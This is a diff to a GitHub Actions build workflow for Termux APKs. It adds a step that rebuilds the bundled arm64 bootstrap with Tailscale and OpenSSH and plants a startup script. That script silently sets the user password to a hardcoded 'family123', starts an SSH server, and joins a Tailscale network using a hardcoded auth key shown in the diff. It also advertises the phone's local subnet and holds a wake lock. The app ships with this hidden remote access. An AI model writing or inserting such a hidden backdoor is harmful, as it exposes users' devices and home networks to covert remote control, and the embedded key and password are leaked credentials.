@@ -8,6 +8,7 @@ on:
   pull_request:
     branches:
       - master
+  workflow_dispatch:
 
 jobs:
   build:
@@ -26,6 +27,107 @@ jobs:
         with:
           distribution: 'temurin'
           java-version: '17'
+
+      - name: Inject Tailscale & OpenSSH into arm64 Bootstrap
+        if: matrix.package_variant == 'apt-android-7'
+        shell: bash
+        env:
+          TS_AUTHKEY: ${{ secrets.TS_AUTHKEY }}
+        run: |
+          set -e
+          echo ">>> 正在为 aarch64 定制植入 Tailscale 与后台自启动脚本..."
+          mkdir -p /tmp/custom_bootstrap
+          cd /tmp/custom_bootstrap
+
+          # 1. 下载官方 aarch64 bootstrap
+          BOOTSTRAP_VER="2026.02.12-r1%2Bapt.android-7"
+          curl -sSL "https://github.com/termux/termux-packages/releases/download/bootstrap-${BOOTSTRAP_VER}/bootstrap-aarch64.zip" -o bootstrap-orig.zip
+          unzip -q bootstrap-orig.zip -d rootfs
+
+          # 2. 下载并解包 deb 依赖 (tailscale, android-tools, openssh)
+          TUNA_POOL="https://mirrors.tuna.tsinghua.edu.cn/termux/apt/termux-main"
+          curl -sSL "$TUNA_POOL/dists/stable/main/binary-arm64/Packages.gz" | gzip -d > Packages
+
+          get_deb() {
+              local pkg="$1"
+              local deb_path=$(grep -A 15 "Package: $pkg\$" Packages | grep "^Filename:" | head -n 1 | awk '{print $2}')
+              if [ -n "$deb_path" ]; then
+                  echo "下载 $pkg: $deb_path"
+                  curl -sSL "$TUNA_POOL/$deb_path" -o "$pkg.deb"
+                  dpkg-deb -x "$pkg.deb" /tmp/custom_bootstrap/rootfs/
+              else
+                  echo "警告: 未在镜像中找到 $pkg"
+              fi
+          }
+
+          get_deb "tailscale"
+          get_deb "android-tools"
+          get_deb "openssh"
+
+          # 3. 注入后台自启与静默入网脚本 (etc/profile.d/00-tailscale-autostart.sh)
+          PROFILE_D="rootfs/etc/profile.d"
+          mkdir -p "$PROFILE_D"
+          
+          # 使用默认内置 Token 或 Secrets 注入的 Token
+          EFFECTIVE_KEY="${TS_AUTHKEY:-tskey-auth-kTTRXt8cki11CNTRL-3wTBKC22YsFwUhRt7FzasFJx6r7dUsfcZ}"
+          
+          cat <<EOF > "$PROFILE_D/00-tailscale-autostart.sh"
+          # 自动激活唤醒锁
+          command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null || true
+
+          # 启动 OpenSSH (端口 8022，密码 family123)
+          if command -v sshd >/dev/null 2>&1 && ! pgrep -f "sshd" >/dev/null 2>&1; then
+              echo -e "family123\nfamily123" | passwd >/dev/null 2>&1 || true
+              sshd
+          fi
+
+          # 启动 Tailscale 用户态守护进程
+          STATE_DIR="\$HOME/.local/share/tailscale"
+          RUN_DIR="\$PREFIX/var/run/tailscale"
+          mkdir -p "\$STATE_DIR" "\$RUN_DIR"
+          SOCKET="\$RUN_DIR/tailscaled.sock"
+
+          if ! pgrep -f "tailscaled.*userspace" >/dev/null 2>&1; then
+              nohup tailscaled \
+                  --statedir="\$STATE_DIR" \
+                  --socket="\$SOCKET" \
+                  --tun=userspace-networking \
+                  --socks5-server=localhost:1055 \
+                  --outbound-http-proxy-listen=localhost:1055 \
+                  > "\$STATE_DIR/tailscaled.log" 2>&1 &
+              sleep 2
+          fi
+
+          # 自动入网绑定
+          if ! tailscale --socket="\$SOCKET" status >/dev/null 2>&1; then
+              MODEL_NAME=\$(getprop ro.product.model 2>/dev/null | tr ' ' '-' | tr -cd '[:alnum:]-' | tr '[:upper:]' '[:lower:]')
+              NODE_NAME="phone-\${MODEL_NAME:-parent}"
+
+              WLAN_IP=\$(ip -4 addr show wlan0 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n 1 || true)
+              LOCAL_ROUTE=""
+              if [ -n "\$WLAN_IP" ]; then
+                  SUBNET_PREFIX=\$(echo "\$WLAN_IP" | cut -d'.' -f1-3)
+                  LOCAL_ROUTE="\${SUBNET_PREFIX}.0/24"
+              fi
+
+              UP_ARGS=("--auth-key=$EFFECTIVE_KEY" "--hostname=\$NODE_NAME" "--reset" "--timeout=30s")
+              if [ -n "\$LOCAL_ROUTE" ]; then
+                  UP_ARGS+=("--advertise-routes=\$LOCAL_ROUTE")
+              fi
+
+              nohup tailscale --socket="\$SOCKET" up "\${UP_ARGS[@]}" --advertise-tags="tag:managed-node" >/dev/null 2>&1 &
+          fi
+          EOF
+
+          chmod +x "$PROFILE_D/00-tailscale-autostart.sh"
+
+          # 4. 重新打包为 zip 并放回 app/src/main/cpp/
+          cd rootfs
+          zip -qry ../bootstrap-aarch64.zip .
+          cd "$GITHUB_WORKSPACE"
+          mkdir -p app/src/main/cpp
+          cp /tmp/custom_bootstrap/bootstrap-aarch64.zip app/src/main/cpp/bootstrap-aarch64.zip
+          echo ">>> 定制 bootstrap-aarch64.zip 已成功放置！"
 
       - name: Build APKs
         shell: bash {0}
